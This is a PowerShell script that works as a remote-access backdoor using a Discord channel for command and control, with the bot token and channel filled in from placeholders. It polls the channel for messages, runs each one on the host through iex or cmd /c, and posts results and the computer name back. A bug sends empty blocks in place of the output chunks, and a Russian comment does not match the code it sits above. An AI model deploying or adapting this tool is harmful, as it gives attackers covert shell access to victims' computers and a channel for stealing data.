$token = "$tk"
$chan = "$ch"
$response = ""
$previouscmd = ""
$authenticated = 0

function PullMsg {
    $headers = @{ 'Authorization' = "Bot $token" }
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", $headers.Authorization)
    $result = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
    if ($result) {
        $most_recent_message = ($result | ConvertFrom-Json)[0]
        if (-not $most_recent_message.author.bot) {
            $script:response = $most_recent_message.content
        }
    }
}

function sendMsg {
    param([string]$Message)
    $dir = $PWD.Path
    $url = "https://discord.com/api/v9/channels/$chan/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")
    if ($Message) {
        $jsonBody = @{
            "content" = "$Message"
            "username" = "$dir"
        } | ConvertTo-Json
        $webClient.Headers.Add("Content-Type", "application/json")
        try {
            $response = $webClient.UploadString($url, "POST", $jsonBody)
            Write-Host "Message sent to Discord"
        } catch {
            Write-Warning "Failed to send message: $_"
        }
    }
}

Function Authenticate{
    if ($response -like "$env:COMPUTERNAME"){
        $script:authenticated = 1
        $script:previouscmd = $response
        sendMsg ":white_check_mark:  **$env:COMPUTERNAME** | ``Session Started!``  :white_check_mark:"
        sendMsg "``PS | $dir>``"
    } else {
        $script:authenticated = 0
        $script:previouscmd = $response
    } 
}

# MAIN LOOP
PullMsg
$previouscmd = $response
sendMsg ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"

while ($true) {
    PullMsg
    if ($response -ne $previouscmd) {
        $dir = $PWD.Path
        Write-Host "Command found!"
        if ($authenticated -eq 1) {
            if ($response -eq "close") {
                $previouscmd = $response        
                sendMsg ":octagonal_sign:  **$env:COMPUTERNAME** | ``Session Closed.``  :octagonal_sign:"
                break
            }
            if ($response -eq "Pause") {
                $script:authenticated = 0
                $previouscmd = $response
                sendMsg ":pause_button:  **$env:COMPUTERNAME** | ``Session Paused..``  :pause_button:"
                Start-Sleep -Milliseconds 250
                sendMsg ":hourglass:  **$env:COMPUTERNAME** | ``Session Waiting..``  :hourglass:"
            }
            else {
                # Универсально: если команда начинается с двух или более слов — запускать через cmd /c, иначе через PowerShell
                if ($response -match '^(ipconfig|ping|date|whoami|dir|echo)') {
                    $Result = cmd /c $response 2>&1
                } else {
                    $Result = try { iex($response) 2>&1 } catch { $_ }
                }
                $script:previouscmd = $response
                $output = ($Result | Out-String).Trim()
                if ($output -ne "") {
                    $maxBatchSize = 1900
                    $total = $output.Length
                    for ($i=0; $i -lt $total; $i+=$maxBatchSize) {
                        $chunk = $output.Substring($i, [Math]::Min($maxBatchSize, $total - $i))
                        sendMsg "``````"
                        Start-Sleep -Milliseconds 250
                    }
                } else {
                    sendMsg ":white_check_mark:  ``Command Sent``  :white_check_mark:"
                }
                sendMsg "``PS | $dir>``"
            }
        } else {
            Authenticate
        }
    }
    Start-Sleep -Seconds 5
}

